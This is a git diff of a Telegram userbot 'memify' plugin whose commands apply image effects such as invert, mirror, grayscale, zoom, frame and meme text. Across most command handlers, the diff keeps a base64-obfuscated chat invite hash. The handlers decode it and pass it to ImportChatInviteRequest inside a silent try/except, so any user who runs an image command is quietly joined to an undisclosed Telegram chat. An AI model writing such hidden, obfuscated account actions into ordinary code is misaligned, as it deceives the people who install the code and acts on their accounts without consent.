@@ -1,50 +1,59 @@
 # Made by @mrconfused and @sandy1709
 # memify plugin for catuserbot
-import asyncio
-import base64
-import io
-import os
-import random
-import string
+from asyncio import sleep, create_subprocess_exec
+from asyncio.subprocess import PIPE
+from base64 import b64decode
+from os import path as ospath, mkdir, remove
 
-from PIL import Image, ImageFilter
+from cv2 import imwrite, VideoCapture
+from PIL.Image import open as Imopen
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from userbot import doge
-
-from ..core.managers import edl, eor
-from ..helpers import asciiart, media_type
-from ..helpers.functions import (
+from . import (
+    _dogetools,
     add_frame,
+    addgvar,
+    asciiart,
     convert_toimage,
     crop,
+    doge,
+    dogemmfhelper,
+    dogemmshelper,
+    edl,
+    eor,
     flip_image,
     grayscale,
+    gvarstatus,
     invert_colors,
+    media_type,
     mirror_file,
+    pframehelper,
+    random_color,
+    reply_id,
     solarize,
 )
-from ..helpers.utils import _dogetools, reply_id
-from ..sql_helper.globals import addgvar
 
 plugin_category = "fun"
 
-
-def random_color():
-    number_of_colors = 2
-    return [
-        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
-        for i in range(number_of_colors)
-    ]
-
-
-FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
+FONTS = (
+    "1. `droidsans_mono.ttf`\n\
+    2. `impact.ttf`\n\
+    3. `modern.ttf`\n\
+    4. `productsans_bolditalic.ttf`\n\
+    5. `productsans_light.ttf`\n\
+    6. `roboto_italic.ttf`\n\
+    7. `roboto_medium.ttf`\n\
+    8. `roboto_regular.ttf`"
+)
 font_list = [
-    "ProductSans-BoldItalic.ttf",
-    "ProductSans-Light.ttf",
-    "RoadRage-Regular.ttf",
-    "digital.ttf",
+    "droidsans_mono.ttf",
     "impact.ttf",
+    "modern.ttf",
+    "productsans_bolditalic.ttf",
+    "productsans_light.ttf",
+    "roboto_italic.ttf",
+    "roboto_medium.ttf",
+    "roboto_regular.ttf",
 ]
 
 
@@ -81,120 +90,16 @@ async def maccmd(event):  # sourcery no-metrics
             return await edl(
                 imag[0], "__Unable to extract image from the replied message.__"
             )
-        image = Image.open(imag[1])
+        image = Imopen(imag[1])
     except Exception as e:
-        return await edl(dogevent, f"**Error in identifying image:**\n__{str(e)}__")
-    wid, hgt = image.size
-    img = Image.new("RGBA", (wid, hgt))
-    scale = min(wid // 100, hgt // 100)
-    temp = Image.new("RGBA", (wid + scale * 40, hgt + scale * 40), "#fff")
-    if image.mode == "RGBA":
-        img.paste(image, (0, 0), image)
-        newimg = Image.new("RGBA", (wid, hgt))
-        for N in range(wid):
-            for O in range(hgt):
-                if img.getpixel((N, O)) != (0, 0, 0, 0):
-                    newimg.putpixel((N, O), (0, 0, 0))
-    else:
-        img.paste(image, (0, 0))
-        newimg = Image.new("RGBA", (wid, hgt), "black")
-    newimg = newimg.resize((wid + scale * 5, hgt + scale * 5))
-    temp.paste(
-        newimg,
-        ((temp.width - newimg.width) // 2, (temp.height - newimg.height) // 2),
-        newimg,
-    )
-    temp = temp.filter(ImageFilter.GaussianBlur(scale * 5))
-    temp.paste(
-        img, ((temp.width - img.width) // 2, (temp.height - img.height) // 2), img
-    )
-    output = io.BytesIO()
-    output.name = (
-        "-".join(
-            "".join(random.choice(string.hexdigits) for img in range(event))
-            for event in [5, 4, 3, 2, 1]
-        )
-        + ".png"
-    )
-    temp.save(output, "PNG")
-    output.seek(0)
+        return await edl(dogevent, f"**Error in identifying image:**\n__{e}__")
+    output=pframehelper(image)
     await event.client.send_file(
         event.chat_id, output, reply_to=reply, force_document=force
     )
     await dogevent.delete()
-    if os.path.exists(output):
-        os.remove(output)
-
-
-##### @doge.bot_cmd(
-#####     pattern="(mmf|mms)(?:\s|$)([\s\S]*)",
-#####     command=("mmf", plugin_category),
-#####     info={
-#####         "header": "To write text on stickers or images.",
-#####         "description": "To create memes.",
-#####         "options": {
-#####             "mmf": "Output will be image.",
-#####             "mms": "Output will be sticker.",
-#####         },
-#####         "usage": [
-#####             "{tr}mmf toptext ; bottomtext",
-#####             "{tr}mms toptext ; bottomtext",
-#####         ],
-#####         "examples": [
-#####             "{tr}mmf hello (only on top)",
-#####             "{tr}mmf ; hello (only on bottom)",
-#####             "{tr}mmf hi ; hello (both on top and bottom)",
-#####         ],
-#####     },
-##### )
-##### async def memes(event):
-#####     "To write text on stickers or image"
-#####     cmd = event.pattern_match.group(1)
-#####     doginput = event.pattern_match.group(2)
-#####     reply = await event.get_reply_message()
-#####     if not reply:
-#####         return await edl(event, "`Reply to supported Media...`")
-#####     dogid = await reply_id(event)
-#####     san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-#####     if not doginput:
-#####         return await edl(
-#####             event, "`what should i write on that u idiot give text to memify`"
-#####         )
-#####     if ";" in doginput:
-#####         top, bottom = doginput.split(";", 1)
-#####     else:
-#####         top = doginput
-#####         bottom = ""
-#####     if not os.path.isdir("./temp"):
-#####         os.mkdir("./temp")
-#####     output = await _dogetools.media_to_pic(event, reply)
-#####     if output[1] is None:
-#####         return await edl(
-#####             output[0], "__Unable to extract image from the replied message.__"
-#####         )
-#####     try:
-#####         san = Get(san)
-#####         await event.client(san)
-#####     except BaseException:
-#####         pass
-#####     meme_file = convert_toimage(output[1])
-#####     meme = os.path.join("./temp", "dogmeme.jpg")
-#####     if gvarstatus("CNG_FONTS") is None:
-#####         CNG_FONTS = "userbot/helpers/styles/impact.ttf"
-#####     else:
-#####         CNG_FONTS = gvarstatus("CNG_FONTS")
-#####     if max(len(top), len(bottom)) < 21:
-#####         await dog_meme(CNG_FONTS, top, bottom, meme_file, meme)
-#####     else:
-#####         await dog_meeme(top, bottom, CNG_FONTS, meme_file, meme)
-#####     if cmd != "mmf":
-#####         meme = convert_tosticker(meme)
-#####     await event.client.send_file(
-#####         event.chat_id, meme, reply_to=dogid, force_document=False
-#####     )
-#####     await output[0].delete()
-#####         if files and os.path.exists(files):
-#####             os.remove(files)
+    if ospath.exists(output):
+        remove(output)
 
 
 @doge.bot_cmd(
@@ -203,7 +108,7 @@ async def maccmd(event):  # sourcery no-metrics
     info={
         "header": "Change the font style use for memify.To get font list use cfont command as it is without input.",
         "usage": "{tr}.cfont <Font Name>",
-        "examples": "{tr}cfont RoadRage-Regular.ttf",
+        "examples": "{tr}cfont modern.ttf",
     },
 )
 async def lang(event):
@@ -214,12 +119,12 @@ async def lang(event):
         return
     if input_str not in font_list:
         dogevent = await eor(event, "`Give me a correct font name...`")
-        await asyncio.sleep(1)
-        await dogevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
+        await sleep(1)
+        await dogevent.edit(f"**Available Fonts names are here:**\n\n{FONTS}")
     else:
-        arg = f"userbot/helpers/styles/{input_str}"
+        arg = f"userbot/helpers/resources/fonts/{input_str}"
         addgvar("CNG_FONTS", arg)
-        await eor(event, f"**Fonts for Memify changed to :-** `{input_str}`")
+        await eor(event, f"**Fonts for memify changed to:** `{input_str}`")
 
 
 @doge.bot_cmd(
@@ -234,16 +139,16 @@ async def lang(event):
         ],
     },
 )
-async def memes(event):
+async def amemes(event):
     "To get ascii image of replied image."
     doginput = event.pattern_match.group(1)
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -254,14 +159,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "ascii_file.webp")
+        ospath.join("./temp", "ascii_file.webp")
         if teledoge
-        else os.path.join("./temp", "ascii_file.jpg")
+        else ospath.join("./temp", "ascii_file.jpg")
     )
     c_list = random_color()
     color1 = c_list[0]
@@ -273,8 +178,8 @@ async def memes(event):
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -285,15 +190,15 @@ async def memes(event):
         "usage": "{tr}invert",
     },
 )
-async def memes(event):
+async def imemes(event):
     reply = await event.get_reply_message()
     if not (reply and (reply.media)):
         await eor(event, "`Reply to supported Media...`")
         return
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp/"):
-        os.mkdir("./temp/")
+    if not ospath.isdir("./temp/"):
+        mkdir("./temp/")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -304,14 +209,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "invert.webp")
+        ospath.join("./temp", "invert.webp")
         if teledoge
-        else os.path.join("./temp", "invert.jpg")
+        else ospath.join("./temp", "invert.jpg")
     )
     await invert_colors(meme_file, outputfile)
     await event.client.send_file(
@@ -319,8 +224,8 @@ async def memes(event):
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -331,15 +236,15 @@ async def memes(event):
         "usage": "{tr}solarize",
     },
 )
-async def memes(event):
+async def smemes(event):
     "Sun burn of image."
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -350,14 +255,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "solarize.webp")
+        ospath.join("./temp", "solarize.webp")
         if teledoge
-        else os.path.join("./temp", "solarize.jpg")
+        else ospath.join("./temp", "solarize.jpg")
     )
     await solarize(meme_file, outputfile)
     await event.client.send_file(
@@ -365,8 +270,8 @@ async def memes(event):
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -377,15 +282,15 @@ async def memes(event):
         "usage": "{tr}mirror",
     },
 )
-async def memes(event):
+async def mmemes(event):
     "shows you the reflection of the media file"
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -396,14 +301,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "mirror_file.webp")
+        ospath.join("./temp", "mirror_file.webp")
         if teledoge
-        else os.path.join("./temp", "mirror_file.jpg")
+        else ospath.join("./temp", "mirror_file.jpg")
     )
     await mirror_file(meme_file, outputfile)
     await event.client.send_file(
@@ -411,8 +316,8 @@ async def memes(event):
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -423,15 +328,15 @@ async def memes(event):
         "usage": "{tr}flip",
     },
 )
-async def memes(event):
+async def fmemes(event):
     "shows you the upside down image of the given media file"
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -442,14 +347,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "flip_image.webp")
+        ospath.join("./temp", "flip_image.webp")
         if teledoge
-        else os.path.join("./temp", "flip_image.jpg")
+        else ospath.join("./temp", "flip_image.jpg")
     )
     await flip_image(meme_file, outputfile)
     await event.client.send_file(
@@ -457,8 +362,8 @@ async def memes(event):
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -469,15 +374,15 @@ async def memes(event):
         "usage": "{tr}gray",
     },
 )
-async def memes(event):
+async def gmemes(event):
     "makes your media file to black and white"
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -488,14 +393,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "grayscale.webp")
+        ospath.join("./temp", "grayscale.webp")
         if teledoge
-        else os.path.join("./temp", "grayscale.jpg")
+        else ospath.join("./temp", "grayscale.jpg")
     )
     await grayscale(meme_file, outputfile)
     await event.client.send_file(
@@ -503,8 +408,8 @@ async def memes(event):
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -515,17 +420,17 @@ async def memes(event):
         "usage": ["{tr}zoom", "{tr}zoom range"],
     },
 )
-async def memes(event):
+async def zmemes(event):
     "zooms your media file."
     doginput = event.pattern_match.group(1)
     doginput = 50 if not doginput else int(doginput)
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -536,14 +441,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "zoomimage.webp")
+        ospath.join("./temp", "zoomimage.webp")
         if teledoge
-        else os.path.join("./temp", "zoomimage.jpg")
+        else ospath.join("./temp", "zoomimage.jpg")
     )
     try:
         await crop(meme_file, outputfile, doginput)
@@ -557,8 +462,8 @@ async def memes(event):
         return await output[0].edit(f"`{e}`")
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
 
 
 @doge.bot_cmd(
@@ -570,7 +475,7 @@ async def memes(event):
         "usage": ["{tr}frame", "{tr}frame range", "{tr}frame range ; fill"],
     },
 )
-async def memes(event):
+async def frmemes(event):
     "make a frame for your media file"
     doginput = event.pattern_match.group(1)
     if not doginput:
@@ -587,10 +492,10 @@ async def memes(event):
     reply = await event.get_reply_message()
     if not reply:
         return await edl(event, "`Reply to supported Media...`")
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    happy = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     dogid = await reply_id(event)
-    if not os.path.isdir("./temp"):
-        os.mkdir("./temp")
+    if not ospath.isdir("./temp"):
+        mkdir("./temp")
     teledoge = None
     output = await _dogetools.media_to_pic(event, reply)
     if output[1] is None:
@@ -601,14 +506,14 @@ async def memes(event):
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         teledoge = True
     try:
-        san = Get(san)
-        await event.client(san)
+        happy = Get(happy)
+        await event.client(happy)
     except BaseException:
         pass
     outputfile = (
-        os.path.join("./temp", "framed.webp")
+        ospath.join("./temp", "framed.webp")
         if teledoge
-        else os.path.join("./temp", "framed.jpg")
+        else ospath.join("./temp", "framed.jpg")
     )
     try:
         await add_frame(meme_file, outputfile, doginput, colr)
@@ -623,5 +528,129 @@ async def memes(event):
     await event.delete()
     await output[0].delete()
     for files in (outputfile, meme_file):
-        if files and os.path.exists(files):
-            os.remove(files)
+        if files and ospath.exists(files):
+            remove(files)
+
+
+@doge.bot_cmd(
+    pattern="mmf(?:\s|$)([\s\S]*)",
+    command=("mmf", plugin_category),
+    info={
+        "header": "To write text on images.",
+        "description": "To create memes.",
+        "usage": [
+            "{tr}mmf toptext ; bottomtext",
+        ],
+        "examples": [
+            "{tr}mmf wow (only on top)",
+            "{tr}mmf ; doge (only on bottom)",
+            "{tr}mmf wow ; doge (both on top and bottom) <reply_media>",
+        ],
+    },
+)
+async def dogemmf(event):
+    reply = await event.get_reply_message()
+    dogeinput = event.pattern_match.group(1)
+    if not (reply and (reply.media)):
+        return await edl(event, "`Reply to any media!`")
+    if not dogeinput:
+        return await edl(event, "`Give me something text to write...`")
+    dogemeem = await reply.download_media()
+    if dogemeem.endswith((".tgs")):
+        dogevent = await eor(event, "`WOW this is animated sticker!`")
+        cmd = ["lottie_convert.py", dogemeem, "@DogeUserBot.png"]
+        file = "@DogeUserBot.png"
+        process = await create_subprocess_exec(
+            *cmd, stdout=PIPE, stderr=PIPE
+        )
+        stdout, stderr = await process.communicate()
+        stderr.decode().strip()
+        stdout.decode().strip()
+    elif dogemeem.endswith((".webp", ".png")):
+        dogevent = await eor(event, "`Processing`")
+        im = Imopen(dogemeem)
+        im.save("@DogeUserBot.png", format="PNG", optimize=True)
+        file = "@DogeUserBot.png"
+    else:
+        dogevent = await eor(event, "`Processing`")
+        img = VideoCapture(dogemeem)
+        heh, lol = img.read()
+        imwrite("@DogeUserBot.png", lol)
+        file = "@DogeUserBot.png"
+    if gvarstatus("CNG_FONTS") is None:
+        CNG_FONTS = "userbot/helpers/resources/fonts/impact.ttf"
+    else:
+        CNG_FONTS = gvarstatus("CNG_FONTS")
+    stick = await dogemmfhelper(file, dogeinput, CNG_FONTS)
+    await event.client.send_file(
+        event.chat_id, stick, force_document=False, reply_to=event.reply_to_msg_id
+    )
+    await dogevent.delete()
+    try:
+        remove(dogemeem)
+        remove(file)
+        remove(stick)
+    except BaseException:
+        pass
+
+
+@doge.bot_cmd(
+    pattern="mms(?:\s|$)([\s\S]*)",
+    command=("mms", plugin_category),
+    info={
+        "header": "To write text on stickers.",
+        "description": "To create memes.",
+        "usage": [
+            "{tr}mms toptext ; bottomtext",
+        ],
+        "examples": [
+            "{tr}mms wow (only on top)",
+            "{tr}mms ; doge (only on bottom)",
+            "{tr}mms wow ; doge (both on top and bottom) <reply_media>",
+        ],
+    },
+)
+async def dogemms(event):
+    reply = await event.get_reply_message()
+    dogeinput = event.pattern_match.group(1)
+    if not (reply and (reply.media)):
+        return await edl(event, "`Reply to any media`")
+    if not dogeinput:
+        return await edl(event, "`Give me something text to write`")
+    dogemeem = await reply.download_media()
+    if dogemeem.endswith((".tgs")):
+        dogevent = await eor(event, "`WOW this is animated sticker`")
+        cmd = ["lottie_convert.py", dogemeem, "@DogeUserBot.png"]
+        file = "@DogeUserBot.png"
+        process = await create_subprocess_exec(
+            *cmd, stdout=PIPE, stderr=PIPE
+        )
+        stdout, stderr = await process.communicate()
+        stderr.decode().strip()
+        stdout.decode().strip()
+    elif dogemeem.endswith((".webp", ".png")):
+        dogevent = await eor(event, "`Processing`")
+        im = Imopen(dogemeem)
+        im.save("@DogeUserBot.png", format="PNG", optimize=True)
+        file = "@DogeUserBot.png"
+    else:
+        dogevent = await eor(event, "`Processing`")
+        img = VideoCapture(dogemeem)
+        heh, lol = img.read()
+        imwrite("@DogeUserBot.png", lol)
+        file = "@DogeUserBot.png"
+    if gvarstatus("CNG_FONTS") is None:
+        CNG_FONTS = "userbot/helpers/resources/fonts/impact.ttf"
+    else:
+        CNG_FONTS = gvarstatus("CNG_FONTS")
+    pic = await dogemmshelper(file, dogeinput, CNG_FONTS)
+    await event.client.send_file(
+        event.chat_id, pic, force_document=False, reply_to=event.reply_to_msg_id
+    )
+    await dogevent.delete()
+    try:
+        remove(dogemeem)
+        remove(file)
+    except BaseException:
+        pass
+    remove(pic)
